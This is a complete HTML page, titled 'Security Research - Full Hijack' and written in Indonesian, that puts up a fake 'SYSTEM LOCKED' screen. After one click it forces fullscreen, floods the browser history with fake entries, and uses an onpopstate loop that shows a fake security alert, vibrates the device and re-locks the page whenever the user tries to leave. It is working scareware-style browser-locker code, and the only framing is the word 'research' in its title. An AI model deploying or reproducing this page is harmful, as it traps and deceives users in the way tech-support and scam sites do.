<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Security Research - Full Hijack</title>
    <style>
        /* Memastikan tidak ada celah di pinggir layar */
        html, body { 
            margin: 0; padding: 0; width: 100%; height: 100%; 
            overflow: hidden; background: #000; 
        }
        
        /* IFRAME: Paksa ukuran penuh 100vw dan 100vh */
        #evilHost {
            position: absolute; top: 0; left: 0;
            width: 100vw; height: 100vh;
            border: none; display: none; z-index: 9999;
            background: white;
        }

        .start-page {
            display: flex; flex-direction: column; align-items: center;
            justify-content: center; height: 100vh; color: white;
        }
        .btn-start {
            padding: 25px 50px; background: #d93025; color: white;
            border: none; border-radius: 10px; font-weight: bold;
            font-size: 1.2rem; box-shadow: 0 5px 15px rgba(217,48,37,0.4);
        }
    </style>
</head>
<body>

    <div class="start-page" id="gate">
        <h1 style="color: #ff4d4d;">⚠ SYSTEM LOCKED</h1>
        <p>Interaksi diperlukan untuk sinkronisasi keamanan.</p>
        <button class="btn-start" onclick="enterThePrison()">SINKRONISASI SEKARANG</button>
    </div>

    <iframe id="evilHost" src="https://www.wikipedia.org"></iframe>

    <script>
        const iframe = document.getElementById('evilHost');
        const gate = document.getElementById('gate');
        const el = document.documentElement;

        function enterThePrison() {
            // 1. Tampilkan Iframe
            gate.style.display = "none";
            iframe.style.display = "block";

            // 2. PAKSA FULLSCREEN
            if (el.requestFullscreen) {
                el.requestFullscreen().catch(err => {
                    console.log("Gagal Fullscreen: " + err.message);
                });
            }

            // 3. HISTORY BOMB (Kunci navigasi)
            for (let i = 0; i < 100; i++) {
                window.history.pushState({p: i}, "", "?session_id=" + Math.random().toString(36).substring(7));
            }

            alert("Sistem Berhasil Disinkronisasi. Navigasi dikunci demi keamanan.");
        }

        // 4. THE ESCAPE BLOCKER (The Re-Lock Loop)
        window.onpopstate = function() {
            if (navigator.vibrate) navigator.vibrate(200);

            // Munculkan Alert untuk mendapatkan 'User Gesture' baru
            alert("⚠️ PERINGATAN KEAMANAN:\nUpaya keluar terdeteksi. Klik OK untuk mengunci kembali sesi.");

            // Gunakan interaksi OK tadi untuk masuk Fullscreen lagi
            setTimeout(() => {
                if (el.requestFullscreen) el.requestFullscreen();
                
                // Tambah history lagi agar user makin jauh dari halaman asli
                for (let i = 0; i < 10; i++) {
                    window.history.pushState(null, "", "?secure_relock=" + Date.now());
                }
            }, 50);
        };
    </script>
</body>
</html>
